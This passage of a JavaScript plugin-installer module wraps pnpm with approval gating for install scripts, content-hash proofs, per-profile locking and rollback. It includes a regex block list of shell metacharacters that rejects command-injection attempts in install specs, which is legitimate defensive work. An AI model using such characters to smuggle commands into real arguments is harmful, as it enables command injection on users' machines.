    try {
      const manifest = JSON.parse(readFileSync(directManifestPath, "utf8"));
      if (manifest && typeof manifest === "object" && manifest.name === pkgName) {
        if (!version || manifest.version === version) {
          const realDir = realpathSync(direct);
          return { dir: realDir, manifest };
        }
      }
    } catch {
      /* fallback to .pnpm */
    }
  }

  // 2. Search in node_modules/.pnpm virtual store
  const pnpmDir = join(modulesRoot, ".pnpm");
  const matches = [];
  if (existsSync(pnpmDir)) {
    try {
      const entries = readdirSync(pnpmDir, { withFileTypes: true });
      for (const entry of entries) {
        if (!entry.isDirectory()) continue;
        const candidatePath = join(pnpmDir, entry.name, "node_modules", ...pkgName.split("/"));
        const mPath = join(candidatePath, "package.json");
        if (existsSync(mPath)) {
          try {
            const manifest = JSON.parse(readFileSync(mPath, "utf8"));
            if (manifest && typeof manifest === "object" && manifest.name === pkgName) {
              if (!version || manifest.version === version) {
                matches.push({ dir: realpathSync(candidatePath), manifest });
              }
            }
          } catch {}
        }
      }
    } catch {}
  }

  const uniqueMatches = [];
  const seenPaths = new Set();
  for (const match of matches) {
    if (!seenPaths.has(match.dir)) {
      seenPaths.add(match.dir);
      uniqueMatches.push(match);
    }
  }

  if (uniqueMatches.length === 1) {
    return uniqueMatches[0];
  }
  if (uniqueMatches.length > 1) {
    throw new Error(`ambiguous materialized package resolution for ${pkgName}${version ? `@${version}` : ""}: multiple distinct copies found in .pnpm`);
  }

  throw new Error(`cannot locate materialized package directory for ${pkgName}${version ? `@${version}` : ""} in ${profileDir}`);
}

/** Extract sorted lifecycle script commands (preinstall, install, postinstall) from manifest. */
export function extractLifecycleScripts(manifest) {
  const scripts = {};
  const raw = manifest?.scripts;
  if (raw && typeof raw === "object") {
    for (const key of ["preinstall", "install", "postinstall"]) {
      if (typeof raw[key] === "string" && raw[key].trim().length > 0) {
        scripts[key] = raw[key];
      }
    }
  }
  return scripts;
}

/** Resolve direct candidate package name from profile state, spec, or preflight. */
export function resolveCandidateName(profileDir, spec, beforeDeps = new Set(), preflight) {
  if (preflight?.candidate?.name && typeof preflight.candidate.name === "string") {
    return preflight.candidate.name;
  }
  const manifestPath = join(profileDir, "package.json");
  if (existsSync(manifestPath)) {
    try {
      const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
      const newDeps = Object.keys(manifest.dependencies ?? {}).filter((d) => !beforeDeps.has(d));
      if (newDeps.length === 1) return newDeps[0];
    } catch {}
  }
  if (typeof spec === "string") {
    const raw = spec.trim();
    if (/^(?:file:|link:)/i.test(raw)) {
      const localDir = resolve(profileDir, raw.replace(/^(?:file:|link:)/i, "").replace(/[\\/]+$/, ""));
      const localPkg = join(localDir, "package.json");
      if (existsSync(localPkg)) {
        try {
          const m = JSON.parse(readFileSync(localPkg, "utf8"));
          if (m?.name) return m.name;
        } catch {}
      }
    }
    const name = npmNameOf(raw);
    if (name) return name;
  }
  const modulesRoot = join(profileDir, "node_modules");
  if (existsSync(modulesRoot)) {
    try {
      const entries = readdirSync(modulesRoot, { withFileTypes: true });
      for (const entry of entries) {
        if (entry.name === ".pnpm" || entry.name.startsWith(".")) continue;
        if (entry.name.startsWith("@")) {
          const scopeEntries = readdirSync(join(modulesRoot, entry.name), { withFileTypes: true });
          for (const se of scopeEntries) {
            const fullName = `${entry.name}/${se.name}`;
            if (!beforeDeps.has(fullName)) return fullName;
          }
        } else if (!beforeDeps.has(entry.name)) {
          return entry.name;
        }
      }
    } catch {}
  }
  return undefined;
}

/**
 * Compute the canonical artifact proof from the materialized package tree.
 * Includes direct candidate identity (and content hash) even when its own
 * scripts are not blocked, plus every blocked package with resolved name, version,
 * sorted lifecycle scripts, and content hash.
 * @param profileDir - target profile directory.
 * @param candidateName - candidate package name.
 * @param ignoredList - array of {name, version} or string names blocked by pnpm.
 * @returns canonical proof object.
 */
export function computeMaterializedProof(profileDir, candidateName, ignoredList = []) {
  if (!candidateName) {
    throw new Error("cannot compute materialized proof: candidate package name is missing or unresolved");
  }
  const candidatePkg = findMaterializedPackage(profileDir, candidateName);
  const candidateScripts = extractLifecycleScripts(candidatePkg.manifest);
  const candidateHash = hashPackageTree(candidatePkg.dir);
  const candidateProof = {
    name: candidatePkg.manifest.name ?? candidateName,
    version: candidatePkg.manifest.version ?? "unknown",
    scripts: candidateScripts,
    contentHash: candidateHash,
  };

  const blockedPackages = [];
  const seen = new Set();
  for (const entry of ignoredList) {
    const pkgName = typeof entry === "string" ? entry.trim() : entry?.name?.trim();
    const selector = typeof entry === "object" && typeof entry?.selector === "string" ? entry.selector : pkgName;
    if (!pkgName || !selector || seen.has(selector)) continue;
    seen.add(selector);
    const version = typeof entry === "object" ? entry.version : undefined;
    const pkg = findMaterializedPackage(profileDir, pkgName, version);
    const scripts = extractLifecycleScripts(pkg.manifest);
    const contentHash = hashPackageTree(pkg.dir);
    blockedPackages.push({
      name: pkg.manifest.name ?? pkgName,
      version: pkg.manifest.version ?? "unknown",
      selector,
      direct: pkgName === candidateName,
      scripts,
      contentHash,
    });
  }

  blockedPackages.sort((a, b) => a.name.localeCompare(b.name) || a.version.localeCompare(b.version) || a.selector.localeCompare(b.selector));

  return {
    candidate: candidateProof,
    blockedPackages,
  };
}

/** Deterministically serialize a canonical proof object into canonical JSON. */
export function serializeCanonicalProof(proof) {
  if (!proof || typeof proof !== "object") return "";
  const normalizeScripts = (scripts) => {
    const out = {};
    if (scripts && typeof scripts === "object") {
      for (const key of ["preinstall", "install", "postinstall"]) {
        if (typeof scripts[key] === "string") out[key] = scripts[key];
      }
    }
    return out;
  };
  const normalizePkg = (pkg) => ({
    name: String(pkg?.name ?? ""),
    version: String(pkg?.version ?? ""),
    selector: String(pkg?.selector ?? pkg?.name ?? ""),
    direct: Boolean(pkg?.direct),
    scripts: normalizeScripts(pkg?.scripts),
    contentHash: String(pkg?.contentHash ?? ""),
  });
  const canonicalObj = {
    candidate: {
      name: String(proof.candidate?.name ?? ""),
      version: String(proof.candidate?.version ?? ""),
      scripts: normalizeScripts(proof.candidate?.scripts),
      contentHash: String(proof.candidate?.contentHash ?? ""),
    },
    blockedPackages: Array.isArray(proof.blockedPackages)
      ? proof.blockedPackages.map(normalizePkg).sort((a, b) => a.name.localeCompare(b.name) || a.version.localeCompare(b.version) || a.selector.localeCompare(b.selector))
      : [],
  };
  return JSON.stringify(canonicalObj);
}

/** Merge optional registry reputation facts with authoritative bytes read from
 * the materialized package. Security fields always come from the proof. */
export function disclosureFromMaterializedProof(proof, hints = []) {
  const hintList = Array.isArray(hints) ? hints : [];
  return (Array.isArray(proof?.blockedPackages) ? proof.blockedPackages : []).map((actual) => {
    const hint = hintList.find((entry) => entry?.name === actual.name && (entry?.version === undefined || entry.version === actual.version)) ?? {};
    return {
      weeklyDownloads: hint.weeklyDownloads,
      provenance: hint.provenance,
      unpackedSize: hint.unpackedSize,
      name: actual.name,
      version: actual.version,
      selector: actual.selector,
      direct: actual.direct,
      scripts: actual.scripts,
      contentHash: actual.contentHash,
    };
  });
}

/** Default pnpm-workspace.yaml for a profile that has none yet. */
const DEFAULT_WORKSPACE_YAML = "packages:\n  - .\n\nnodeLinker: hoisted\n";

/**
 * Apply mergeAllowBuilds to the profile's pnpm-workspace.yaml through the
 * guarded writer.
 * @returns a rollback function, or undefined when nothing needed changing.
 */
function ensureAllowBuilds(profileDir, names) {
  const workspacePath = join(profileDir, "pnpm-workspace.yaml");
  const content = existsSync(workspacePath) ? readFileSync(workspacePath, "utf8") : DEFAULT_WORKSPACE_YAML;
  const next = mergeAllowBuilds(content, names);
  if (next === undefined) return undefined;
  return writeYamlChecked(workspacePath, next, "pnpm-workspace.yaml");
}

// ── in-process install tracker (browser RPC surface) ────────────────────────
//
// The web host plane has no job controller (dsh-tool-jobs mounts per agent
// session), so ctx.jobs refuses background installs started outside an agent
// turn. The /market RPC channel therefore tracks its own installs in-process:
// same producer shape as the jobs registry ({cancel, done, readOutput}), just
// an independent registry.

let trackerCounter = 0;

/**
 * Create a tracker for browser-started install/uninstall jobs (see runInstall
 * and runRemove). Same producer shape as the jobs registry ({cancel, done,
 * readOutput}), just an independent registry.
 */
export function createJobTracker() {
  const records = new Map();
  const prune = () => {
    const now = Date.now();
    for (const [id, record] of records) {
      const terminal = record.status !== "running";
      if (terminal && record.finishedAt !== undefined && now - record.finishedAt > 3600000) records.delete(id);
    }
    if (records.size > 20) {
      const ordered = [...records.entries()].sort((a, b) => a[1].startedAt - b[1].startedAt);
      for (const [id, record] of ordered) {
        if (records.size <= 20) break;
        if (record.status !== "running") records.delete(id);
      }
    }
  };
  return {
    start({ profile, spec, verb = "add", allowBuildScripts, approvedProof, preflight, onSettled }) {
      const id = `market-${++trackerCounter}`;
      const kind = verb === "remove" ? "dsh-plugin-uninstall" : "dsh-plugin-install";
      const producer = verb === "remove" ? runRemove({ profile, packageName: spec }) : runInstall({ profile, spec, allowBuildScripts, approvedProof, preflight });
      const record = {
        id,
        kind,
        label: `dsh plugin --profile ${profile} ${verb} ${spec}`,
        profile,
        spec,
        status: "running",
        detail: undefined,
        startedAt: Date.now(),
        finishedAt: undefined,
        producer,
      };
      producer.done.then((outcome) => {
        record.status = outcome.status ?? "failed";
        record.detail = outcome.detail;
        // 待批准的构建脚本清单：浏览器侧据此渲染「允许并继续」，没有它就只有
        // 一段文本，用户看不出要批准的到底是什么。
        record.needsApproval = outcome.needsApproval;
        record.finishedAt = Date.now();
        onSettled?.(outcome);
      });
      records.set(id, record);
      prune();
      return id;
    },
    get(jobId) {
      const record = records.get(String(jobId));
      if (record === undefined) throw new Error(`unknown install job ${JSON.stringify(String(jobId))}`);
      return {
        snapshot: {
          id: record.id,
          kind: record.kind,
          label: record.label,
          status: record.status,
          detail: record.detail,
          needsApproval: record.needsApproval,
          spec: record.spec,
          startedAt: record.startedAt,
          finishedAt: record.finishedAt,
        },
        output: record.producer.readOutput(),
      };
    },
    cancel(jobId) {
      const record = records.get(String(jobId));
      if (record === undefined) throw new Error(`unknown install job ${JSON.stringify(String(jobId))}`);
      record.producer.cancel();
      return "requested";
    },
  };
}

// ── spec shape guard ────────────────────────────────────────────────────────

// Windows spawn 走 shell，spec 会被拼进 cmd 行；agent 传入的参数不可信。
// 合法的 npm 名 / github:owner\/repo / git·file·link·URL spec 都不含这些
// shell 元字符——出现即拒绝，宁可误杀不放开命令注入面。`%` 在列：cmd 会
// 做 `%VAR%` 环境变量展开，展开结果常含分号/空格，足以改变参数切分。
// （cli.js 的同款黑名单一直含 %，此前三处已经漂移。）
const UNSAFE_SPEC_RE = /[;&|`$()<>^%!"*\n\r]/;

/** Reject install/remove specs carrying shell metacharacters. */
export function assertSafeSpec(spec) {
  const value = String(spec ?? "");
  if (UNSAFE_SPEC_RE.test(value)) {
    throw new Error(`spec contains characters that are not allowed in an install spec: ${JSON.stringify(value)}`);
  }
  // Windows 下 pnpm 走 shell，而 Node 只是把参数用空格 join 后交给 cmd，
  // 不逐参加引号——带空格的本地路径会被拆成两个参数，pnpm 报一个和路径
  // 毫无关系的错。用户也没法自己加引号绕过：`"` 就在上面的黑名单里。
  // 与其让它以看不懂的方式失败，不如在这里说清楚。
  if (process.platform === "win32" && /^(?:file:|link:)/i.test(value) && /\s/.test(value)) {
    throw new Error(`local path specs cannot contain spaces on Windows — pnpm is spawned through cmd, which would split the path into two arguments: ${JSON.stringify(value)}`);
  }
}

// ── pnpm self-heal (corepack) ───────────────────────────────────────────────

/**
 * Try to provision pnpm once via `corepack enable pnpm` (corepack ships with
 * Node). Output lands in the caller's job log; returns whether a retry of the
 * pnpm spawn is worth attempting.
 */
async function enablePnpmViaCorepack(push) {
  push("\n[dsh-plugin-mall] pnpm not found on PATH — trying `corepack enable pnpm` once\n");
  return await new Promise((resolve) => {
    let proc;
    try {
      proc = spawn("corepack", ["enable", "pnpm"], {
        env: process.env,
        shell: process.platform === "win32",
        stdio: ["ignore", "pipe", "pipe"],
        windowsHide: true,
      });
    } catch {
      resolve(false);
      return;
    }
    proc.on("error", () => resolve(false));
    proc.stdout?.on("data", (data) => push(data.toString()));
    proc.stderr?.on("data", (data) => push(data.toString()));
    proc.on("close", (code) => resolve(code === 0));
  });
}

// ── per-profile transaction serialization ───────────────────────────────────
//
// Install and remove mutate the same profile files (package.json, lockfile,
// workspace yaml, patch layer) and node_modules. Two pnpm processes running
// concurrently in one profile interleave those writes and can corrupt both
// transactions. Every producer — add AND remove — therefore runs through a
// per-profile in-process queue: a job starts only after the previous one
// reached a terminal state, and the lock is released on every outcome
// (completed/failed/killed) and on internal errors.

const profileQueues = new Map(); // lockKey -> Promise<void> tail

/** Lock key for a profile: the resolved dir when the name is valid. */
function profileLockKey(profile) {
  try {
    return resolveProfileDir(profile);
  } catch {
    return `invalid:${String(profile)}`;
  }
}

function enqueueProfileTask(lockKey, task) {
  const key = String(lockKey);
  const tail = profileQueues.get(key) ?? Promise.resolve();
  const run = tail.then(task, task);
  // The stored tail never rejects, so one poisoned task can never stall the
  // queue; it is dropped from the map once it is the latest settled tail.
  const stored = run.then(() => undefined, () => undefined);
  profileQueues.set(key, stored);
  void stored.then(() => {
    if (profileQueues.get(key) === stored) profileQueues.delete(key);
  });
  return run;
}

/**
 * Run a producer factory under the profile's queue. The returned producer
 * settles `done` with the inner producer's outcome; cancel() before the job
 * starts settles it as killed without ever spawning pnpm. `done` ALWAYS
 * resolves with an outcome object — never rejects — so callers (and the
 * queue itself) have exactly one settlement path.
 */
function serializedProducer(lockKey, start) {
  let inner;
  let cancelRequested = false;
  const done = enqueueProfileTask(lockKey, () => {
    if (cancelRequested) {
      return { status: "killed", detail: "cancelled while queued behind another profile transaction — pnpm never ran" };
    }
    try {
      inner = start();
    } catch (error) {
      return { status: "failed", detail: error?.message ?? String(error) };
    }
    return Promise.resolve(inner.done).then(
      (outcome) => outcome,
      (error) => ({ status: "failed", detail: `internal error: ${error?.message ?? String(error)}` }),
    );
  });
  return {
    cancel: () => {
      cancelRequested = true;
      inner?.cancel();
    },
    done,
    readOutput: () => inner?.readOutput() ?? "",
  };
}

// ── pnpm spawn plan (Windows cancel correctness) ────────────────────────────
//
// Killing a shell-wrapped process kills the WRAPPER, not pnpm: on Windows
// `shell: true` spawns `cmd /d /s /c pnpm ...`, and proc.kill() terminates
// cmd.exe while the real pnpm (a grandchild) keeps running — and keeps
// mutating the profile while rollback restores it. So: spawn pnpm without a
// shell wherever the platform allows it, and when Windows forces a wrapper
// (a .cmd shim cannot be spawned with shell:false on modern Node), cancel
// terminates the whole process tree and the done chain waits for the
// wrapper's 'close' before any rollback runs.
//
// The plan itself is pnpmSpawnPlan in guard.js (imported above) — one
// implementation, not a local mirror. It quotes the .cmd path: Node's
// shell:true joins without per-argument quoting, and `D:\Program Files\…`
// would be cut at the first space (`'D:\Program' is not recognized`).

/**
 * Terminate a shell-wrapped process tree (Windows): taskkill /T /F kills the
 * wrapper AND its descendants, synchronously, so cancel() returns only after
 * the tree is signalled; the wrapper's 'close' then resolves the done chain
 * and rollback runs strictly after every pnpm process has exited.
 */
function killProcessTree(proc) {
  if (process.platform !== "win32" || typeof proc?.pid !== "number") {
    try { proc?.kill(); } catch { /* already gone */ }
    return;
  }
  try {
    spawnSync("taskkill", ["/pid", String(proc.pid), "/T", "/F"], { stdio: "ignore", windowsHide: true, timeout: 10000 });
  } catch { /* taskkill missing — fall through to a plain kill */ }
  try { proc.kill(); } catch { /* already gone */ }
}

/** Kill the in-flight pnpm spawn, tree-killing when it runs in a shell wrapper. */
function cancelSpawned(current) {
  if (current === undefined || current === null) return;
  if (current.treeKill === true) killProcessTree(current.proc);
  else {
    try { current.proc.kill(); } catch { /* already exited */ }
  }
}

/** Mirrors guard.js pendingPath(): <home>/guard/pending-<profile>.json. */
function pendingMarkerPath(profileDir) {
  return join(dirname(dirname(profileDir)), "guard", `pending-${basename(profileDir)}.json`);
}

// ── the background install job ──────────────────────────────────────────────

/**
 * Run `pnpm add <spec>` in the profile directory as a job producer with the
 * shape `ctx.jobs.start` expects: `{ cancel, done: Promise<outcome>, readOutput: () => string }`.
 * A failure whose output lists ignored build scripts gets one automatic
 * retry after merging those names into `allowBuilds`.
 */
/**
 * Render "here is exactly what you would be approving". Deliberately avoids
 * any wording like "security check passed" — approving these scripts says
 * nothing about what the plugin does once it is loaded.
 */
function renderApprovalNeeded(spec, disclosure) {
  const lines = [
    `installing ${spec} requires running install-time code — approval needed.`,
    "No install script ran and no plugin code loaded. The profile was restored",
    "to its pre-install state. On approval, pnpm resolves again with scripts",
    "blocked; the materialized bytes and commands must match this disclosure",
    "before the verified tree is rebuilt. Nothing is left behind if you cancel.",
    "",
  ];
  for (const entry of disclosure) {
    const origin = entry.direct
      ? "the plugin itself"
      : "a transitive dependency — NOT the package you asked for";
    lines.push(`  ${entry.name}${entry.version ? `@${entry.version}` : ""}   (${origin})`);
    if (entry.selector) lines.push(`      pnpm selector: ${entry.selector}`);
    for (const [key, command] of Object.entries(entry.scripts ?? {})) lines.push(`      ${key}: ${command}`);
    if (entry.contentHash) lines.push(`      artifact SHA-256: ${entry.contentHash}`);
    const facts = [];
    if (typeof entry.weeklyDownloads === "number") facts.push(`${entry.weeklyDownloads.toLocaleString()} weekly downloads`);
    facts.push(entry.provenance === true ? "has provenance" : "no provenance");
    if (typeof entry.unpackedSize === "number") facts.push(`${Math.round(entry.unpackedSize / 104857.6) / 10} MB unpacked`);
    lines.push(`      ${facts.join(" · ")}`);
  }
  lines.push("");
  lines.push("These commands run on your machine, with your privileges, before any plugin code loads.");
  lines.push(`To proceed, install again with allowBuildScripts: [${disclosure.map((entry) => JSON.stringify(entry.name)).join(", ")}]`);
  return lines.join("\n");
}

/**
 * Args for the live `pnpm add`. Peer auto-install is disabled just like in the
 * disposable probe install (guard.js probeAddArgs): a marketplace install must
 * never pull the @deepseek-ai host peer stack into the profile. The spec is
 * validated by assertSafeSpec before this runs; every other argv entry is a
 * fixed string.
 *
 * strict-dep-builds forces pnpm to FAIL when it blocks a build script instead
 * of exiting 0 while printing "Ignored build scripts" — which used to bypass
 * the approval gate entirely and finalize a success with the scripts silently
 * skipped. The successful output is still inspected (see settle), so even a
 * pnpm that does not honor the flag cannot slip ignored builds past the gate.
 */
function liveAddArgs(spec) {
  return [
    "add",
    spec,
    "--reporter=append-only",
    "--config.auto-install-peers=false",
    "--config.strict-dep-builds=true",
    "--config.dangerously-allow-all-builds=false",
  ];
}

/** Rebuild only the already-materialized packages whose exact pnpm selectors
 * were approved. Unlike a second `pnpm add <spec>`, this never re-resolves a
 * mutable file/git/tag spec after the proof comparison. */
function rebuildApprovedArgs(packageNames) {
  const names = [...new Set(packageNames)].sort();
  if (names.length === 0 || names.some((name) => !NPM_NAME_RE.test(name))) {
    throw new Error("cannot rebuild an empty or invalid approved package set");
  }
  return ["rebuild", ...names, "--reporter=append-only"];
}

/**
 * Env for the live `pnpm add`. pnpmGuardEnv disables peer auto-install; the
 * strict-dep-builds pair is the env form of the --config flag above and also
 * reaches any pnpm the install itself spawns (git-hosted deps, nested runs).
 */
function liveAddEnv(base = process.env) {
  return {
    ...pnpmGuardEnv(base),
    npm_config_strict_dep_builds: "true",
    NPM_CONFIG_STRICT_DEP_BUILDS: "true",
    npm_config_dangerously_allow_all_builds: "false",
    NPM_CONFIG_DANGEROUSLY_ALLOW_ALL_BUILDS: "false",
  };
}

export function runInstall({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace }) {
  // Serialized with every other add/remove targeting the same profile (see
  // serializedProducer). Underscored arguments are self-test seams; production
  // callers never pass them. `_restoreWorkspace` exists specifically so the
  // fail-closed restoration path can be attacked without relying on flaky OS
  // permission tricks.
  return serializedProducer(_profileDir ?? profileLockKey(profile), () =>
    runInstallInner({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace }));
}

function runInstallInner({ profile, spec, allowBuildScripts, approvedProof, preflight, _profileDir, _spawn, _describe, _restoreWorkspace }) {
  const profileDir = _profileDir ?? ensureProfile(profile);
  try {
    assertNoManifestBuildBypass(profileDir);
  } catch (error) {
    return failedNow(`cannot safely probe install scripts for ${spec}: ${error.message}`);
  }
  // Dependency keys BEFORE pnpm add, so reconcile only manages entries that
  // were (or became) dependencies and never touches template bundles.
  const beforeDeps = new Set(Object.keys(readManifest(profileDir).dependencies ?? {}));
  const collected = [];
  const deltaQueue = [];
  const push = (text) => {
    collected.push(text);
    deltaQueue.push(text);
  };

  const workspacePath = join(profileDir, "pnpm-workspace.yaml");
  const originalWorkspaceBytes = existsSync(workspacePath) ? readFileSync(workspacePath) : undefined;
  let workspaceRestored = false;
  let workspaceRestoreError;
  const restoreOriginalWorkspace = () => {
    if (workspaceRestored) return true;
    try {
      if (_restoreWorkspace !== undefined) {
        _restoreWorkspace(workspacePath, originalWorkspaceBytes);
      } else if (originalWorkspaceBytes === undefined) {
        rmSync(workspacePath, { force: true });
      } else {
        writeFileSync(workspacePath, originalWorkspaceBytes);
      }
      workspaceRestored = true;
      workspaceRestoreError = undefined;
      return true;
    } catch (err) {
      workspaceRestoreError = err;
      push(`\n[dsh-plugin-mall] WARNING: could not restore pnpm-workspace.yaml: ${err.message}\n`);
      return false;
    }
  };

  // Snapshot the four profile files and register the pending marker BEFORE the
  // first live pnpm add runs. These are the files that decide what pnpm
  // installs and what dsh loads; the marker is what lets startup/CLI recovery
  // roll the profile back if the plugin proves unloadable.
  let snapshot;
  try {
    snapshot = createProfileSnapshot(profileDir, { spec });
  } catch (error) {
    return failedNow(`cannot snapshot profile before installing ${spec}: ${error.message} — refusing to touch the profile`);
  }
  try {
    markPendingSnapshot(snapshot, { spec, preflight });
  } catch (error) {
    rmSync(snapshot.dir, { recursive: true, force: true });
    return failedNow(`cannot register the install pending marker for ${spec}: ${error.message} — refusing to touch the profile`);
  }

  // Neutralize existing allowBuilds before every first pnpm add so strict-dep-builds
  // always blocks candidate lifecycle scripts regardless of pre-existing workspace policy.
  try {
    if (originalWorkspaceBytes !== undefined) {
      const neutralized = neutralizeWorkspaceContent(originalWorkspaceBytes.toString("utf8"));
      writeYamlChecked(workspacePath, neutralized, "pnpm-workspace.yaml");
    } else {
      writeYamlChecked(workspacePath, DEFAULT_WORKSPACE_YAML, "pnpm-workspace.yaml");
    }
  } catch (error) {
    const restored = restoreOriginalWorkspace();
    try {
      if (restored) commitPendingSnapshot(profileDir);
      else rollbackPendingSnapshot(profileDir);
    } catch (cleanupError) {
      return failedNow(`cannot neutralize workspace build policy before installing ${spec}: ${error.message}; cleanup also failed: ${cleanupError.message}`);
    }
    return failedNow(`cannot neutralize workspace allowBuilds before installing ${spec}: ${error.message} — refusing to touch the profile`);
  }

  let current = undefined;
  let pnpmSelfHealed = false;
  const plan = _spawn === undefined ? pnpmSpawnPlan() : { command: "pnpm", shell: false, treeKill: false };
  const spawnImpl = _spawn ?? spawn;

  const spawnAdd = () => {
    const proc = spawnImpl(plan.command, liveAddArgs(spec), {
      cwd: profileDir,
      env: liveAddEnv(),
      shell: plan.shell,
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
    const done = new Promise((resolve) => {
      proc.on("error", (error) => resolve({ spawnError: error }));
      proc.on("close", (exitCode) => resolve({ exitCode, signal: proc.signalCode }));
    });
    proc.stdout?.on("data", (data) => push(data.toString()));
    proc.stderr?.on("data", (data) => push(data.toString()));
    return { proc, done, treeKill: plan.treeKill };
  };

  const spawnApprovedRebuild = (packageNames) => {
    const proc = spawnImpl(plan.command, rebuildApprovedArgs(packageNames), {
      cwd: profileDir,
      env: liveAddEnv(),
      shell: plan.shell,
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    });
    const done = new Promise((resolveDone) => {
      proc.on("error", (error) => resolveDone({ spawnError: error }));
      proc.on("close", (exitCode) => resolveDone({ exitCode, signal: proc.signalCode }));
    });
    proc.stdout?.on("data", (data) => push(data.toString()));
    proc.stderr?.on("data", (data) => push(data.toString()));
    return { proc, done, treeKill: plan.treeKill };
  };

  /** Post-success accounting: reconcile bundles, register client rows, summarize. */
  const finalizeSuccess = () => {
    const bundles = reconcileBundles(profileDir, beforeDeps);
    const manifest = readManifest(profileDir);
    const currentDeps = new Set(Object.keys(manifest.dependencies ?? {}));
    const clientRows = [];
    const plainDeps = [];
    for (const depName of currentDeps) {
      if (beforeDeps.has(depName)) continue;
      const kind = classifyPackage(depName, profileDir);
      if (kind === "client") {
        const row = ensureClientRow(profileDir, depName);
        if (row.added) clientRows.push(row.rowId);
      } else if (kind !== "bundle") {
        plainDeps.push(depName);
      }
    }
    const notes = [];
    const activeBundles = bundles.filter((name) => currentDeps.has(name));
    if (activeBundles.length > 0) notes.push(`bundle layer(s): ${activeBundles.join(", ")}`);
    if (clientRows.length > 0) notes.push(`registered client row(s) in cordis.patch.yml: ${clientRows.join(", ")}`);
    if (plainDeps.length > 0) notes.push(`plain dependency (no dsh.bundle/dsh.client): ${plainDeps.join(", ")}`);
    const noteText = notes.length > 0 ? ` — ${notes.join("; ")}` : " — installed as a plain dependency (declares no dsh.bundle)";
    return { status: "completed", detail: `installed ${spec} into profile "${profile}"${noteText}. Restart dsh for plugin code to load.` };
  };

  const tryFinalize = () => {
    try {
      return finalizeSuccess();
    } catch (error) {
      return { status: "failed", detail: `pnpm installed ${spec} but post-install reconciliation failed: ${error?.message ?? String(error)}` };
    }
  };

  const settle = async (outcome) => {
    if (outcome.spawnError !== undefined) {
      if (outcome.spawnError.code === "ENOENT" && !pnpmSelfHealed) {
        pnpmSelfHealed = true;
        const healed = await enablePnpmViaCorepack(push);
        if (healed) {
          const retry = spawnAdd();
          current = retry;
          return settle(await retry.done);
        }
        restoreOriginalWorkspace();
        return { status: "failed", detail: "pnpm not found on PATH and `corepack enable pnpm` could not provision it — install pnpm (e.g. `npm i -g pnpm`) to manage profile plugins" };
      }
      restoreOriginalWorkspace();
      const hint = outcome.spawnError.code === "ENOENT"
        ? "pnpm not found on PATH — install pnpm (e.g. `corepack enable pnpm`) to manage profile plugins"
        : `could not start pnpm: ${outcome.spawnError.message}`;
      return { status: "failed", detail: hint };
    }
    if (outcome.exitCode === null) {
      restoreOriginalWorkspace();
      return { status: "killed", detail: outcome.signal ? `signal: ${outcome.signal}` : "killed before exit" };
    }
    const log = collected.join("");
    const ignored = parseIgnoredBuilds(log);

    if (ignored.length === 0) {
      if (!restoreOriginalWorkspace()) {
        return { status: "failed", detail: `could not restore pnpm-workspace.yaml after the script-blocking probe: ${workspaceRestoreError?.message ?? "unknown error"}` };
      }
      if (outcome.exitCode !== 0) {
        return { status: "failed", detail: `pnpm add ${spec} failed (exit code ${outcome.exitCode}). See job output.` };
      }
      return tryFinalize();
    }

    // Materialized proof calculation:
    // Determine candidate name and compute canonical proof from the materialized tree
    const candidateName = resolveCandidateName(profileDir, spec, beforeDeps, preflight);
    let currentProof;
    try {
      currentProof = computeMaterializedProof(profileDir, candidateName, ignored);
    } catch (proofErr) {
      restoreOriginalWorkspace();
      return { status: "failed", detail: `failed to compute materialized package proof for ${spec}: ${proofErr.message}` };
    }

    const consented = new Set((Array.isArray(allowBuildScripts) ? allowBuildScripts : []).map((name) => String(name)));
    const missing = ignored.filter((entry) => !consented.has(entry.name));
    if (missing.length > 0 || approvedProof === undefined) {
      push(`\n[dsh-plugin-mall] pnpm blocked install scripts for: ${ignored.map((entry) => entry.name).join(", ")}\n`);
      push("[dsh-plugin-mall] stopping for approval — no install script ran, nothing is loadable yet.\n");
      let disclosure;
      try {
        const hints = _describe !== undefined
          ? await _describe(missing.length > 0 ? missing : ignored)
          : await describeBuildScripts(missing.length > 0 ? missing : ignored, {
            registry: await resolveRegistry(profile),
            installedName: npmNameOf(spec) ?? undefined,
          });
        disclosure = disclosureFromMaterializedProof(currentProof, hints);
      } catch {
        disclosure = disclosureFromMaterializedProof(currentProof);
      }
      if (!restoreOriginalWorkspace()) {
        return { status: "failed", detail: `could not restore pnpm-workspace.yaml after preparing install-script disclosure: ${workspaceRestoreError?.message ?? "unknown error"}` };
      }
      return { status: "failed", detail: renderApprovalNeeded(spec, disclosure), needsApproval: disclosure, proof: currentProof };
    }

    // Canonical proof verification on retry:
    // Require exact byte-for-byte canonical proof equality
    const currentProofStr = serializeCanonicalProof(currentProof);
    const approvedProofStr = serializeCanonicalProof(approvedProof);
    if (currentProofStr !== approvedProofStr) {
      push("\n[dsh-plugin-mall] security error: materialized package proof does not match approved token proof (content, scripts, or package identity changed) — refusing to run scripts and rolling back\n");
      restoreOriginalWorkspace();
      return {
        status: "failed",
        detail: "security verification failed: package content, scripts, or resolved identity changed after approval was granted — install aborted to protect the profile.",
      };
    }

    push(`\n[dsh-plugin-mall] approved install scripts: ${ignored.map((entry) => entry.name).join(", ")}\n`);
    push("[dsh-plugin-mall] temporarily allowing them in the profile's pnpm-workspace.yaml and retrying once.\n");

    workspaceRestored = false; // allow writing temporary approved builds
    try {
      const currentWs = existsSync(workspacePath) ? readFileSync(workspacePath, "utf8") : DEFAULT_WORKSPACE_YAML;
      const nextWs = enableApprovedBuildSelectors(currentWs, ignored.map((entry) => entry.selector));
      writeYamlChecked(workspacePath, nextWs, "pnpm-workspace.yaml");
    } catch (error) {
      restoreOriginalWorkspace();
      return { status: "failed", detail: `could not allow the blocked build scripts: ${error.message}. The profile was left untouched.` };
    }

    const retry = spawnApprovedRebuild(ignored.map((entry) => entry.name));
    current = retry;
    const retryOutcome = await retry.done;

    // Restore workspace bytes on EVERY branch (including success) before finalize
    if (!restoreOriginalWorkspace()) {
      return { status: "failed", detail: `approved scripts finished but pnpm-workspace.yaml could not be restored: ${workspaceRestoreError?.message ?? "unknown error"}` };
    }

    if (retryOutcome.spawnError !== undefined) {
